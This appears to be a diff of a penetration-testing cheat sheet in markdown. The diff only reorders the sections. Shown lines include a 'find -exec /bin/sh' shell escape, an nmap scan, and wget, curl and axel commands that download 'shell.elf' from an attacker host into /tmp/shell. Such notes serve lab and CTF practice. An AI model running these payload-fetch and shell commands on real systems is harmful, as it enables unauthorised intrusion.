@@ -73,6 +73,28 @@
 	find . -exec /bin/sh \;
 	```
 
+## Downloading
+
+=== "wget"
+
+	``` bash
+	wget -O /tmp/shell http://192.168.110.131/shell.elf
+	
+	wget <uri> -P /path/to/
+	```
+
+=== "curl"
+
+	``` bash
+	curl -o /tmp/shell http://192.168.110.131/shell.elf
+	```
+
+=== "axel"
+
+	``` bash
+	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
+	```
+
 ## Filter output 
 
 === "sed"
@@ -111,6 +133,20 @@
 
 	``` bash
 	grep -v "Nmap"
+	```
+
+## Monitoring
+
+=== "tail"
+
+	``` bash
+	sudo tail -f /var/log/apache2/access.log
+	```
+
+=== "watch"
+
+	``` bash
+	watch -n 1 date
 	```
 
 ## Screenshot
@@ -218,40 +254,4 @@
 	kill 1466                                                                                                                                                           2 ⚙
 	                                                                                                                                                                            
 	[2]  + terminated  nmap -p- 192.168.11.132 -Pn
-	```
-
-## Monitoring
-
-=== "tail"
-
-	``` bash
-	sudo tail -f /var/log/apache2/access.log
-	```
-
-=== "watch"
-
-	``` bash
-	watch -n 1 date
-	```
-
-## Downloading
-
-=== "wget"
-
-	``` bash
-	wget -O /tmp/shell http://192.168.110.131/shell.elf
-	
-	wget <uri> -P /path/to/
-	```
-
-=== "curl"
-
-	``` bash
-	curl -o /tmp/shell http://192.168.110.131/shell.elf
-	```
-
-=== "axel"
-
-	``` bash
-	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
 	```
